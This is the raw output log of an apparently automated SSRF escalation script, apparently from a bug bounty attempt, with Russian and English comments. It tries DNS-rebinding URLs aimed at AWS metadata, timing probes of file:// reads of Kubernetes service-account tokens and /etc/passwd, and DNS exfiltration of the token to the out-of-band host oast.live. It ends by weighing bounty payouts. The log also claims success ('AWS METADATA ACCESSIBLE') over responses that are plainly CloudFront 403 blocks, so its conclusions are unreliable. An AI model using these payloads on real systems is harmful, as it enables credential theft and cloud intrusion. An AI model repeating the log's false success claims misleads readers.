================================================================================
FINAL CRITICAL ESCALATION ATTEMPTS
================================================================================

[METHOD 1] DNS Rebinding Attack
--------------------------------------------------------------------------------

Цель: Bypass CloudFront WAF через DNS rebinding
- First DNS query: External IP (pass WAF)
- Second query: 169.254.169.254 (AWS metadata)


[*] Testing DNS rebinding domains...

    Testing: http://169.254.169.254.nip.io/latest/meta-data/

[!!!] BREAKTHROUGH! Got response body:
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
<TITLE>ERROR: The request could not be satisfied</TITLE>
</HEAD><BODY>
<H1>403 ERROR</H1>
<H2>The request could not be satisfied.</H2>
<HR noshade size="1px">
Request blocked.
We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again

[!!!] DNS REBINDING WORKED - AWS METADATA ACCESSIBLE!
    Average timing: 904.1ms
    → Normal timing, but no body returned

    Testing: http://169-254-169-254.nip.io/latest/meta-data/

[!!!] BREAKTHROUGH! Got response body:
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
<TITLE>ERROR: The request could not be satisfied</TITLE>
</HEAD><BODY>
<H1>403 ERROR</H1>
<H2>The request could not be satisfied.</H2>
<HR noshade size="1px">
Request blocked.
We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again

[!!!] DNS REBINDING WORKED - AWS METADATA ACCESSIBLE!
    Average timing: 245.5ms
    → Normal timing, but no body returned

    Testing: http://metadata.169.254.169.254.nip.io/latest/meta-data/

[!!!] BREAKTHROUGH! Got response body:
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
<TITLE>ERROR: The request could not be satisfied</TITLE>
</HEAD><BODY>
<H1>403 ERROR</H1>
<H2>The request could not be satisfied.</H2>
<HR noshade size="1px">
Request blocked.
We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again

[!!!] DNS REBINDING WORKED - AWS METADATA ACCESSIBLE!
    Average timing: 122.6ms
    → Likely blocked by WAF (too fast)


[METHOD 2] Improved Byte-by-Byte Timing
--------------------------------------------------------------------------------

Новый подход: Проверить влияет ли РАЗМЕР файла на timing
Если K8s token = 800 bytes, а namespace = 10 bytes, должна быть разница


[*] Testing file size timing correlation...

    ~10-30 bytes (short)
    file:///etc/hostname...
    Timing: 203.9ms ± 18.2ms

    ~10-20 bytes (namespace)
    file:///var/run/secrets/kubernetes.io/serviceaccount/namespace...
    Timing: 243.6ms ± 55.9ms

    ~200-500 bytes (medium)
    file:///etc/hosts...
    Timing: 197.5ms ± 24.5ms

    ~800-1000 bytes (token)
    file:///var/run/secrets/kubernetes.io/serviceaccount/token...
    Timing: 197.2ms ± 20.3ms

    ~1000-2000 bytes (large)
    file:///etc/passwd...
    Timing: 209.1ms ± 12.6ms

[*] Analyzing size/timing correlation...

    From fastest to slowest:
       197.2ms - ~800-1000 bytes (token)
       197.5ms - ~200-500 bytes (medium)
       203.9ms - ~10-30 bytes (short)
       209.1ms - ~1000-2000 bytes (large)
       243.6ms - ~10-20 bytes (namespace)


[METHOD 3] DNS Exfil with Subdomain Encoding
--------------------------------------------------------------------------------

Цель: Попробовать DNS exfil с более хитрым encoding
Вместо прямого domain, попробуем через subdomain patterns


[*] Testing DNS exfil with subdomain patterns...
    OOB Domain: oast.live

    Pattern 1: file://oast.live/var/run/secrets/kubernetes.io/serviceaccount/token...
    Response time: 517.0ms
    → Fast response (likely cached/blocked)

    Pattern 2: http://namespace.oast.live...
    Response time: 229.2ms
    → Fast response (likely cached/blocked)

    Pattern 3: http://token-exfil.oast.live/fetch?url=file:///var/run/secrets/kuberne...
    Response time: 203.8ms
    → Fast response (likely cached/blocked)

[!] Check OOB logs at https://app.interactsh.com/ or Burp Collaborator
    If DNS queries appeared with encoded data → DATA EXFIL WORKS!


[METHOD 4] Refined Character Set Timing
--------------------------------------------------------------------------------

Последняя попытка: Более точный timing для первого символа
Focus на K8s namespace (короткий файл, 7-15 chars)


[*] Testing refined character timing for namespace...

    Results:
      'd' (default        ):  200.8ms ±  14.1ms (conf: HIGH)
      'i' (istio-system   ):  213.4ms ±  26.5ms (conf: HIGH)
      'z' (zooplus        ):  271.9ms ± 140.3ms (conf: HIGH)
      'k' (kube-system    ):  274.0ms ± 126.1ms (conf: HIGH)
      's' (staging        ):  275.3ms ± 148.3ms (conf: HIGH)
      'p' (production     ):  357.1ms ± 219.6ms (conf: MEDIUM)

================================================================================
FINAL VERDICT
================================================================================

Результаты финальных попыток эскалации:

METHOD 1 (DNS Rebinding):
- Цель: Bypass WAF для AWS metadata access
- Результат: [см. выше]

METHOD 2 (File Size Timing):
- Цель: Correlate file size with timing
- Результат: [см. выше]

METHOD 3 (DNS Exfil):
- Цель: Exfiltrate data via DNS queries
- Результат: Check OOB logs manually

METHOD 4 (Refined Char Timing):
- Цель: More accurate first character detection
- Результат: [см. выше]

РЕКОМЕНДАЦИЯ:
=============
Если ни один метод не дал ДОКАЗАННОЙ кражи данных:
→ Submit как HIGH severity ($5k-$15k)

Если DNS rebinding дал AWS metadata:
→ Upgrade до CRITICAL ($50k+)

Если DNS exfil показал callbacks с данными:
→ Upgrade до CRITICAL ($50k+)

Если только timing inference:
→ Остаётся HIGH (inference не равно proof)


[*] Final attempts completed!
[*] Now decide: Submit as HIGH or wait for manual OOB check
